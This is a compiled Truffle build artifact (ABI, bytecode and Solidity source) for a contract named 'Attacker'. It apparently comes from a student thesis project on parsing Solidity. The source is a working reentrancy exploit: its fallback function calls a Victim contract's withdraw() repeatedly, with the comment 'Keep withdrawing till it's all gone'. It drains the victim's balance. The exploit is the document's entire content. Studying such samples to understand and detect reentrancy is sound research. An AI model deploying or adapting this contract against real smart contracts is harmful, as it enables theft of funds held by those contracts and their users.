{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "victim",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "c",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "balance",
          "type": "uint256"
        }
      ],
      "name": "LogFallback",
      "type": "event"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "count",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516102c23803806102c28339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061022e806100946000396000f3fe6080604052600436106100295760003560e01c806306661abd1461012e5780639e5faafc14610159575b7ff4159b37750c1f8102b811a1409a82c505fbd359fd52574d3523feca952764f160015447604051808381526020018281526020019250505060405180910390a160008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311461012c576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561011357600080fd5b505af1158015610127573d6000803e3d6000fd5b505050505b005b34801561013a57600080fd5b50610143610170565b6040518082815260200191505060405180910390f35b34801561016557600080fd5b5061016e610176565b005b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101df57600080fd5b505af11580156101f3573d6000803e3d6000fd5b5050505056fea265627a7a72315820a3a0c1ef8607cd6cf7734731bd9965589c2d2208cc922167c13684b904819e1864736f6c63430005100032",
  "source": "pragma solidity >= 0.5.8;\r\n\r\n//import Victim's source code\r\nimport './Victim.sol';\r\ncontract Attacker {\r\n    Victim v;\r\n    uint public count;\r\n    event LogFallback(uint c, uint balance);\r\n \r\n    //Create the contract object \r\n    //by setting the address of the Victim\r\n    constructor(address victim) public {\r\n        v = Victim(victim);\r\n    }\r\n\r\n    function attack() public{\r\n        v.withdraw();\r\n    }\r\n\r\n    //Fallback defined with external\r\n    function () external payable {\r\n        //emit repetition \r\n        emit LogFallback(count, address(this).balance);\r\n\r\n        //Keep withdrawing till it's all gone\r\n        if (address(v).balance != 0) {\r\n            v.withdraw();\r\n        }\r\n    }\r\n}",
  "sourcePath": "C:/Users/User/OneDrive - Swinburne Masters/OneDrive - Swinburne University Of Technology Sarawak Campus/Notes/Pre Draft Thesis/sol-web-parser/contracts/Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.16+commit.9c3226ce.Emscripten.clang"
  },
  "schemaVersion": "3.3.3",
  "updatedAt": "2021-03-29T13:13:49.675Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}